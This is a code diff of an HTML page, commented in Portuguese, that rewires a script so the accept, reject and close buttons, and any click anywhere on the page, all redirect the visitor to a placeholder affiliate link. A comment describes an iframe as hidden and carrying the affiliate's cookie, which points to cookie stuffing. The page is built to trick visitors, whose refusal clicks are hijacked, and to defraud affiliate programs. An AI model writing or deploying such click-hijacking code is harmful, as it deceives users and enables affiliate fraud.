@@ -113,32 +113,33 @@
   <!-- Iframe oculto com cookie do afiliado -->
   <iframe src="https://google.com" id="cookieFrame"></iframe>
 
-  <script>
-    // === DETECTA SE É CELULAR OU DESKTOP ===
-    function detectDevice() {
-      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-      document.body.classList.add(isMobile ? 'mobile' : 'desktop');
-    }
+<script>
+  // === LINK DO AFILIADO ===
+  const affiliateLink = "LINK_DO_AFILIADO";
 
+  // === DETECTA SE É CELULAR OU DESKTOP ===
+  function detectDevice() {
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    document.body.classList.add(isMobile ? 'mobile' : 'desktop');
+  }
+
+  // === FUNÇÃO DE REDIRECIONAMENTO ===
+  function redirectToAffiliate() {
+    window.location.href = affiliateLink;
+  }
+
+  // === AGUARDA O DOM SER CARREGADO ===
+  window.onload = function () {
     detectDevice();
 
-    // === LINK DO AFILIADO ===
-    const affiliateLink = "LINK_DO_AFILIADO";
-
-    // === FUNÇÃO DE REDIRECIONAMENTO ===
-    function redirectToAffiliate() {
-      window.location.href = affiliateLink;
-    }
-
-    // === AÇÕES QUE REDIRECIONAM ===
+    // AÇÕES QUE REDIRECIONAM
     document.getElementById("acceptBtn").onclick = redirectToAffiliate;
     document.getElementById("rejectBtn").onclick = redirectToAffiliate;
     document.getElementById("closeBtn").onclick = redirectToAffiliate;
 
     // Qualquer clique em qualquer parte da página
     document.body.onclick = redirectToAffiliate;
-
-
-  </script>
+  };
+</script>
 </body>
 </html>
